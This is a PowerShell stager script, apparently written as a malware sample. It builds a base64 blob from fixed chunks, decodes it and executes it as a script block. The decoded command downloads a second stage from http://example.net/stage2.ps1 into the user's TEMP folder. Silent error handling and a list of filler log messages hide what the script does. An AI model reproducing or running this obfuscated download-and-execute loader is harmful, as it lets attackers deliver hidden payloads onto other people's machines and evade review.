
<#
.SYNOPSIS
    Chunked encoded-stage workflow.

.DESCRIPTION
    Assembles a base64 command from several fixed chunks, decodes
    the result into a PowerShell string and passes it to the
    stage invoker with bounded error handling.

.NOTES
    The stage body is assembled at runtime.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\stage.log",
    [int]$TimeoutSec = 178
)
$ErrorActionPreference = "Stop"

# Decoder
function Expand-EncodedStage {
    param(
        [string]$EncodedText = ''
    )

    Write-Verbose ("Decoding " + $EncodedText.Length + " base64 characters")
    $StageBytes = [Convert]::FromBase64String($EncodedText)
    return [Text.Encoding]::Unicode.GetString($StageBytes)
}

# Invoker
function Invoke-EncodedStage {
    param(
        [string]$StageText = ""
    )

    if ([string]::IsNullOrWhiteSpace($StageText)) {
        throw "Decoded stage is empty"
    }
    $ScriptBlock = [ScriptBlock]::Create($StageText)
    return $ScriptBlock.Invoke()
}

$EncodedCommand = (
    "JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAu" +
    'AG4AZQB0AC8AcwB0AGEAZwBlADIALgBwAHMAMQAiADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIA' +
    'ZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABTAHQAYQBnAGUAMgBVAHIAbAAgAC0ATwB1AHQARgBp' +
    'AGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABzAHQAYQBnAGUAMgAuAGIAaQBuACIAIAAtAFUA' +
    'cwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAA=='
)

try {
    Write-Verbose "Starting encoded-stage workflow"
    if (-not [string]::IsNullOrWhiteSpace($EncodedCommand)) {
    $ScriptBody = Expand-EncodedStage -EncodedText $EncodedCommand
    $StageResult = Invoke-EncodedStage -StageText $ScriptBody
    }
    else {
        Write-Warning "Encoded stage blob is empty"
    }
}
catch {
    Write-Warning "Encoded workflow failed: $($_.Exception.Message)"
}

$EncodedReport = [ordered]@{
    Stage = "encoded"
    BlobLength = $EncodedCommand.Length
    TimeoutSec = $TimeoutSec
}
$EncodedReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Reading configuration values"
Write-Verbose "Checking local path"
Write-Verbose "Validating result"
Write-Verbose "Operation completed"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Collecting host metadata"
Write-Verbose "Exporting operation report"
Write-Verbose "Inspecting process list"
Write-Verbose "Preparing working directory"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Resolving configured target"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
